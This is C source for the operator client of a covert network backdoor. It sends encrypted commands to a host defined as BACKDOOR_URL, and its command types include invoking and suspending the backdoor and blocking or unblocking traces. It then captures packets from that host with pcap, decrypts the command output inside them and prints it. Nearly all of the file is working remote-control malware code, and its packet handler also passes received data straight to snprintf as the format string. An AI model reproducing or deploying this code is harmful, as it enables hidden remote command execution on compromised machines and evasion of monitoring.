#include "nyatta.h"

static char *line = NULL;
static unsigned long message_id = 0;

static int send_empty_command(unsigned long message_id, int command_type)
{
  unsigned char message[MESSAGE_BUF_SIZE], buf[24];
  int res;

  generate_rand_string(buf, 24);
  craft_message(message, AUTH_HEADER, message_id, command_type, 24, buf, buf);

  res = send_request(message);
  return res;
}

static int send_command(unsigned long message_id, int command_type, unsigned char *payload, size_t payload_len)
{
  int ciphertext_len, res;
  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
  unsigned char message[MESSAGE_BUF_SIZE];

  randombytes_buf(nonce, sizeof(nonce));
  if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)payload, payload_len, nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
  {
    log_error("encrypt");
    return -1;
  }

  to_hex(ciphertext, ciphertext_len, ciphertext_hex);
  to_hex(nonce, sizeof(nonce), nonce_hex);
  if (craft_message(message, AUTH_HEADER, message_id, command_type, ciphertext_len, ciphertext_hex, nonce_hex) < 0)
  {
    log_error("craft_message");
    return -1;
  }

  res = send_request(message);
  return res;
}

static void cleanup()
{
  free(line);
  curl_global_cleanup();
  exit(EXIT_SUCCESS);
}

static void data_packet_handler(unsigned char *params, const struct pcap_pkthdr *packet_info, const unsigned char *packet)
{
  const unsigned char *ptr;
  int ip_hlen, tcp_hlen, eth_ip_tcp_hlen, tot_len, payload_len;
  struct libnet_ipv4_hdr *iph;
  struct libnet_tcp_hdr *tcph;
  unsigned char *payload;
  unsigned char message_str[DATA_BUF_SIZE], result[BUF_SIZE];
  struct message message;

  eth_ip_tcp_hlen = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr);
  if ((packet_info->caplen - eth_ip_tcp_hlen) <= 0)
  {
    // log_error("no data, skipping packet...");
    return;
  }

  ptr = packet;

  // locate ip header
  ptr += LIBNET_ETH_H;
  iph = (struct libnet_ipv4_hdr *)(ptr);

  ip_hlen = iph->ip_hl * 4;

  // locate tcp header
  ptr += ip_hlen;
  tcph = (struct libnet_tcp_hdr *)(ptr);

  tcp_hlen = tcph->th_off * 4;

  // parse tcp data
  ptr += tcp_hlen;

  tot_len = ntohs(iph->ip_len);
  payload_len = tot_len - (ip_hlen + tcp_hlen);

  if (payload_len == 0)
  {
    // log_error("no data, skipping packet...");
    return;
  }

  if ((payload = (unsigned char *)strstr((char *)ptr, PAYLOAD_HEADER)) == NULL)
  {
    // log_error("no payload header, skipping packet...");
    return;
  }

  payload += PAYLOAD_HEADER_LEN;

  snprintf((char *)message_str, sizeof(message_str), (char *)payload);

  // strip newlines at the end
  message_str[strcspn((char *)message_str, "\r\n")] = 0;

  parse_message(message_str, &message);

  // check auth header
  if (strcmp((char *)message.auth_header, (char *)AUTH_HEADER) != 0)
  {
    log_error("invalid auth header");
    return;
  }

  if (message.type == TYPE_SEND_CMD_RESULT)
  {
    if (decrypt(result, message.ciphertext, message.ciphertext_len, message.nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH) < 0)
    {
      log_error("decrypt");
      return;
    }
    printf("%s", result);
  }
  else
  {
    log_error("unsupported message type, skipping packet...");
  }

  return;
}

static void* data_loop(void *params)
{
  char filter[BUF_SIZE];
  int *port = (int *)(params);

  printf("INFO: created data loop with filter: src host %s and port %i\n", BACKDOOR_URL, *port);
  snprintf(filter, sizeof(filter), "src host %s and port %i", BACKDOOR_URL, *port);
  setup_network_listener(INFINITE_TIMEOUT, filter, data_packet_handler, NULL);

  pthread_exit(NULL);
}

int main()
{
  ssize_t n;
  size_t len = 0;
  int command_type, i, dl_port;
  char buf[BUF_SIZE];
  pthread_t thread_id;

  curl_global_init(CURL_GLOBAL_DEFAULT);

  signal(SIGINT, cleanup);

  send_empty_command(message_id, TYPE_INVOKE_BACKDOOR);
  message_id++;

  dl_port = LISTEN_PORT;
  if (pthread_create(&thread_id, NULL, data_loop, (void *)&dl_port) != 0)
  {
    log_error("pthread_create");
    exit(EXIT_FAILURE);
  }

  while ((n = getline(&line, &len, stdin)) != -1)
  {
    // remove newline
    line[n - 1] = 0;
    i = 0;
    while (line[i] != ' ' && line[i] != '\0')
    {
      i++; 
    }
    snprintf(buf, sizeof(buf), "%.*s", i, line);
    command_type = get_command_type(buf);

    if (command_type == TYPE_INVOKE_BACKDOOR || command_type == TYPE_SUSPEND_BACKDOOR
      || command_type == TYPE_BLOCK_TRACE || command_type == TYPE_UNBLOCK_TRACE
    )
    {
      if (send_empty_command(message_id, command_type) < 0)
      {
        log_error("send_empty_command");
        continue;
      }
    }
    else
    {
      if (send_command(message_id, command_type, (unsigned char *)line, len) < 0)
      {
        log_error("send_command");
        continue;
      }
    }

    message_id++;
  }

  cleanup();

  return 0;
}